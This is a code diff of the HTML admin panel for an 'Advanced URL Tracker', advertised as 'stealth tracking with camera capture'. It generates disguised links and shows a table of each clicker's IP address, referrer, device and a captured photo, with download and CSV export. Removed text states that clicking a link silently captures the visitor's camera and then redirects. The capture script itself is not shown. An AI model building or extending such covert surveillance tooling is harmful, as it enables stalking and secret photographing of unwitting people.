@@ -1,250 +1,156 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>Admin Panel</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - URL Tracker</title>
     <style>
         :root {
-            --primary: #4361ee;
-            --secondary: #3f37c9;
-            --accent: #4895ef;
-            --danger: #f72585;
-            --light: #f8f9fa;
-            --dark: #212529;
-            --gray: #6c757d;
-            --success: #4cc9f0;
+            --primary: #2563eb;
+            --secondary: #1d4ed8;
+            --dark: #1e293b;
+            --light: #f8fafc;
+            --gray: #94a3b8;
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
         }
         
         body {
-            background-color: #f5f7fa;
+            background-color: #f1f5f9;
             color: var(--dark);
             line-height: 1.6;
-            padding: 20px;
         }
         
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
+            padding: 20px;
         }
         
         header {
             background: linear-gradient(135deg, var(--primary), var(--secondary));
             color: white;
-            padding: 25px;
-            text-align: center;
+            padding: 2rem;
+            border-radius: 0.5rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
         }
         
         h1 {
-            font-size: 2.2rem;
-            margin-bottom: 10px;
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
         }
         
         .panel {
-            padding: 25px;
+            background: white;
+            border-radius: 0.5rem;
+            padding: 2rem;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
         }
         
         .url-generator {
             background-color: var(--light);
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 30px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
-        }
-        
-        .url-generator h2 {
-            margin-bottom: 15px;
-            color: var(--secondary);
+            padding: 1.5rem;
+            border-radius: 0.5rem;
+            margin-bottom: 2rem;
         }
         
         .input-group {
             display: flex;
-            margin-bottom: 15px;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
         }
         
-        .input-group input {
+        input[type="text"] {
             flex: 1;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 5px 0 0 5px;
-            font-size: 16px;
-            outline: none;
+            padding: 0.75rem 1rem;
+            border: 1px solid #e2e8f0;
+            border-radius: 0.375rem;
+            font-size: 1rem;
         }
         
-        .input-group button {
-            padding: 12px 20px;
+        button {
+            padding: 0.75rem 1.5rem;
             background-color: var(--primary);
             color: white;
             border: none;
-            border-radius: 0 5px 5px 0;
+            border-radius: 0.375rem;
             cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s;
+            font-weight: 500;
+            transition: all 0.2s;
         }
         
-        .input-group button:hover {
+        button:hover {
             background-color: var(--secondary);
-        }
-        
-        .result {
-            margin-top: 15px;
+            transform: translateY(-1px);
         }
         
         .controls {
             display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .controls button {
-            padding: 10px 15px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: 500;
-            transition: all 0.3s;
-        }
-        
-        #refresh-btn {
-            background-color: var(--accent);
-            color: white;
-        }
-        
-        #export-btn {
-            background-color: var(--success);
-            color: white;
-        }
-        
-        #clear-btn {
-            background-color: var(--danger);
-            color: white;
-        }
-        
-        .controls button:hover {
-            opacity: 0.9;
-            transform: translateY(-2px);
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
         }
         
         table {
             width: 100%;
             border-collapse: collapse;
-            margin-top: 20px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            margin-top: 1.5rem;
+            font-size: 0.875rem;
         }
         
         th, td {
-            padding: 12px 15px;
+            padding: 1rem;
             text-align: left;
-            border-bottom: 1px solid #e0e0e0;
+            border-bottom: 1px solid #e2e8f0;
         }
         
         th {
-            background-color: var(--primary);
-            color: white;
-            font-weight: 500;
-        }
-        
-        tr:nth-child(even) {
-            background-color: #f9f9f9;
+            background-color: var(--light);
+            font-weight: 600;
         }
         
         tr:hover {
-            background-color: #f1f1f1;
+            background-color: #f8fafc;
         }
         
         .modal {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
+            right: 0;
+            bottom: 0;
             background: rgba(0, 0, 0, 0.8);
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 1000;
+            z-index: 100;
         }
         
         .modal-content {
             background: white;
-            padding: 20px;
-            border-radius: 8px;
+            padding: 2rem;
+            border-radius: 0.5rem;
             max-width: 90%;
             max-height: 90%;
-            overflow: auto;
             position: relative;
         }
         
         .close-modal {
             position: absolute;
-            top: 10px;
-            right: 10px;
-            font-size: 24px;
+            top: 1rem;
+            right: 1rem;
+            font-size: 1.5rem;
             cursor: pointer;
-            color: var(--gray);
         }
         
         .camera-image {
             max-width: 100%;
             max-height: 80vh;
-            border-radius: 5px;
-        }
-        
-        .password-protect {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-        }
-        
-        .password-box {
-            background: #f5f7fa;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-        
-        .password-box input {
-            padding: 12px 15px;
-            margin: 15px 0;
-            width: 100%;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-        
-        .password-box button {
-            padding: 12px 25px;
-            background-color: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s;
-        }
-        
-        .password-box button:hover {
-            background-color: var(--secondary);
+            border-radius: 0.25rem;
         }
         
         @media (max-width: 768px) {
@@ -252,33 +158,14 @@
                 flex-direction: column;
             }
             
-            .input-group input {
-                border-radius: 5px;
-                margin-bottom: 10px;
-            }
-            
-            .input-group button {
-                border-radius: 5px;
-            }
-            
             th, td {
-                padding: 8px 10px;
-                font-size: 14px;
+                padding: 0.75rem;
             }
         }
     </style>
 </head>
 <body>
-    <div class="password-protect" id="password-protect">
-        <div class="password-box">
-            <h2>Admin Login</h2>
-            <p>Enter password to access tracking data</p>
-            <input type="password" id="password-input" placeholder="Enter password">
-            <button onclick="checkPassword()">Continue</button>
-        </div>
-    </div>
-
-    <div class="container" id="admin-panel" style="display:none">
+    <div class="container">
         <header>
             <h1>Advanced URL Tracker</h1>
             <p>Stealth tracking with camera capture</p>
@@ -291,24 +178,24 @@
                     <input type="text" id="target-url" placeholder="https://example.com">
                     <button id="generate-btn">Generate</button>
                 </div>
-                <div class="result" id="result"></div>
+                <div id="result" style="margin-top: 1rem;"></div>
             </div>
             
             <div class="controls">
                 <button id="refresh-btn">Refresh Data</button>
-                <button id="export-btn">Export as CSV</button>
-                <button id="clear-btn">Clear All Data</button>
+                <button id="export-btn">Export CSV</button>
+                <button id="clear-btn">Clear Data</button>
             </div>
             
             <table id="data-table">
                 <thead>
                     <tr>
-                        <th>Timestamp</th>
-                        <th>IP Address</th>
+                        <th>Time</th>
+                        <th>IP</th>
                         <th>Target URL</th>
                         <th>Referrer</th>
                         <th>Device</th>
-                        <th>Camera</th>
+                        <th>Photo</th>
                     </tr>
                 </thead>
                 <tbody></tbody>
@@ -317,33 +204,31 @@
     </div>
 
     <script>
-    // Password Protection
-    const ADMIN_PASSWORD = "tracker123"; // Change this to your password
+    // Password protection
+    const ADMIN_PASSWORD = "admin123"; // Change this!
     
     function checkPassword() {
-        const input = document.getElementById('password-input').value;
-        if (input === ADMIN_PASSWORD) {
-            document.getElementById('password-protect').style.display = 'none';
-            document.getElementById('admin-panel').style.display = 'block';
-            loadTrackingData();
-        } else {
-            alert('Incorrect password');
+        const password = prompt("Enter admin password:");
+        if (password !== ADMIN_PASSWORD) {
+            window.location.href = "/";
         }
     }
     
+    checkPassword();
+    
     // Load tracking data
-    function loadTrackingData() {
-        const data = JSON.parse(localStorage.getItem('tracking_data') || '[]');
+    function loadData() {
+        const data = JSON.parse(localStorage.getItem('track_data') || []);
         const tbody = document.querySelector('#data-table tbody');
         
         tbody.innerHTML = data.map(item => `
             <tr>
                 <td>${new Date(item.timestamp).toLocaleString()}</td>
                 <td>${item.ip}</td>
-                <td><a href="${item.targetUrl}" target="_blank">${shortenUrl(item.targetUrl)}</a></td>
+                <td><a href="${item.target}" target="_blank">${shortenUrl(item.target)}</a></td>
                 <td>${shortenReferrer(item.referrer)}</td>
-                <td>${getDeviceType(item.userAgent)}</td>
-                <td>${item.cameraData ? `<button onclick="showImage('${item.cameraData}')">View</button>` : 'No capture'}</td>
+                <td>${item.userAgent.includes('Mobile') ? '📱 Mobile' : '💻 Desktop'}</td>
+                <td>${item.image ? `<button onclick="showImage('${item.image}')">View</button>` : 'No photo'}</td>
             </tr>
         `).join('');
     }
@@ -351,75 +236,65 @@
     function shortenUrl(url) {
         try {
             const u = new URL(url);
-            return u.hostname + (u.pathname !== '/' ? u.pathname.substring(0, 15) + (u.pathname.length > 15 ? '...' : '') : '');
+            return u.hostname.replace('www.', '');
         } catch {
-            return url.substring(0, 30) + (url.length > 30 ? '...' : '');
+            return url.length > 30 ? url.substring(0, 30) + '...' : url;
         }
     }
     
-    function shortenReferrer(referrer) {
-        if (referrer === 'Direct') return referrer;
+    function shortenReferrer(ref) {
+        if (ref === 'Direct') return ref;
         try {
-            const u = new URL(referrer);
-            return u.hostname;
+            const u = new URL(ref);
+            return u.hostname.replace('www.', '');
         } catch {
-            return referrer.substring(0, 20) + (referrer.length > 20 ? '...' : '');
+            return ref.length > 20 ? ref.substring(0, 20) + '...' : ref;
         }
     }
     
-    function getDeviceType(userAgent) {
-        if (/mobile/i.test(userAgent)) return '📱 Mobile';
-        if (/tablet/i.test(userAgent)) return '🖥 Tablet';
-        return '💻 Desktop';
-    }
-    
-    function showImage(imageData) {
+    function showImage(src) {
         const modal = document.createElement('div');
         modal.className = 'modal';
         modal.innerHTML = `
             <div class="modal-content">
                 <span class="close-modal" onclick="this.parentElement.parentElement.remove()">&times;</span>
-                <h3>Camera Capture</h3>
-                <img src="${imageData}" class="camera-image" alt="Camera capture">
-                <p><button onclick="downloadImage('${imageData}')">Download Image</button></p>
+                <img src="${src}" class="camera-image" alt="Captured photo">
+                <div style="margin-top: 1rem;">
+                    <button onclick="downloadImage('${src}')">Download</button>
+                </div>
             </div>
         `;
         document.body.appendChild(modal);
     }
     
-    function downloadImage(imageData) {
+    function downloadImage(src) {
         const link = document.createElement('a');
-        link.href = imageData;
-        link.download = `capture-${new Date().getTime()}.jpg`;
+        link.href = src;
+        link.download = `capture-${Date.now()}.jpg`;
         link.click();
     }
     
     // Generate tracking URL
     document.getElementById('generate-btn').addEventListener('click', function() {
-        const targetUrl = document.getElementById('target-url').value.trim();
-        if (!targetUrl) {
-            alert('Please enter a URL');
-            return;
-        }
+        const url = document.getElementById('target-url').value.trim();
+        if (!url) return alert('Please enter a URL');
         
         try {
-            new URL(targetUrl);
+            new URL(url);
         } catch {
-            alert('Invalid URL format');
-            return;
+            return alert('Invalid URL format');
         }
         
-        const trackingId = 'trk_' + Math.random().toString(36).substr(2, 9);
-        const encodedUrl = encodeURIComponent(targetUrl);
-        const trackingUrl = `${window.location.origin}/?track=${trackingId}&target=${encodedUrl}`;
+        const trackingId = 'trk_' + Math.random().toString(36).substr(2, 8);
+        const encodedUrl = encodeURIComponent(url);
+        const trackingUrl = `${window.location.origin}/track/?track=${trackingId}&target=${encodedUrl}`;
         
         document.getElementById('result').innerHTML = `
-            <p><strong>Tracking URL:</strong></p>
-            <input type="text" value="${trackingUrl}" style="width: 100%; padding: 8px; margin-bottom: 10px;" readonly>
-            <button onclick="copyToClipboard()">Copy URL</button>
-            <p style="margin-top: 10px; font-size: 14px; color: #666;">
-                When someone clicks this link, it will silently capture their camera (if available) and redirect to the target URL.
-            </p>
+            <div style="background: #f1f5f9; padding: 1rem; border-radius: 0.375rem;">
+                <p style="margin-bottom: 0.5rem; font-weight: 500;">Tracking URL:</p>
+                <input type="text" value="${trackingUrl}" style="width: 100%; padding: 0.75rem; border: 1px solid #e2e8f0; border-radius: 0.375rem; margin-bottom: 0.5rem;" readonly>
+                <button onclick="copyToClipboard()">Copy URL</button>
+            </div>
         `;
     });
     
@@ -431,14 +306,14 @@
     }
     
     // Control buttons
-    document.getElementById('refresh-btn').addEventListener('click', loadTrackingData);
+    document.getElementById('refresh-btn').addEventListener('click', loadData);
     
     document.getElementById('export-btn').addEventListener('click', function() {
-        const data = JSON.parse(localStorage.getItem('tracking_data') || '[]');
-        let csv = 'Timestamp,IP Address,Target URL,Referrer,Device,Screen\n';
+        const data = JSON.parse(localStorage.getItem('track_data') || []);
+        let csv = 'Timestamp,IP Address,Target URL,Referrer,Device\n';
         
         data.forEach(item => {
-            csv += `"${new Date(item.timestamp).toLocaleString()}","${item.ip}","${item.targetUrl}","${item.referrer}","${getDeviceType(item.userAgent)}","${item.screen}"\n`;
+            csv += `"${new Date(item.timestamp).toLocaleString()}","${item.ip}","${item.target}","${item.referrer}","${item.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}"\n`;
         });
         
         const blob = new Blob([csv], { type: 'text/csv' });
@@ -450,14 +325,14 @@
     });
     
     document.getElementById('clear-btn').addEventListener('click', function() {
-        if (confirm('Are you sure you want to delete ALL tracking data? This cannot be undone.')) {
-            localStorage.removeItem('tracking_data');
-            loadTrackingData();
+        if (confirm('Delete ALL tracking data? This cannot be undone.')) {
+            localStorage.removeItem('track_data');
+            loadData();
         }
     });
     
-    // Auto-focus password input
-    document.getElementById('password-input').focus();
+    // Initial load
+    loadData();
     </script>
 </body>
 </html>
